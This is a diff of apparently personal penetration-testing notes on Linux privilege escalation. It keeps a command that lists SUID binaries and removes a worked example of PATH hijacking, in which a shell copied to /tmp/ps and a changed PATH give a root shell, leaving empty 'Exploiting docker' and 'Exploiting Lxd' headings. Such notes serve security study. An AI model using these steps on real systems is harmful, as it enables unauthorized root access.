@@ -243,31 +243,7 @@ Find a command with `SUID` or `4000` permission:
 find / -perm -u=s -type f 2> /dev/null
 ```
 
-When we find the `SUID` protam (source code):
+## Exploiting docker
 
-```c
-#include <unistd.h>
+## Exploiting Lxd
 
-void main()
-{
-    setuid(0);
-    setgid(0);
-    system("ps");
-}
-```
-
-This program can run the program `ps`, to run the `ps` program the shell will search for the `ps` command in the `PATH` variable.
-
-So we can copy a shell to some directory like `/tmp`:
-
-```sh
-cp /bin/sh /tmp/ps
-```
-
-And change the `PATH` variable:
-
-```sh
-export PATH=/tmp:$PATH
-```
-
-And when the program is executed we can spawn a shell.
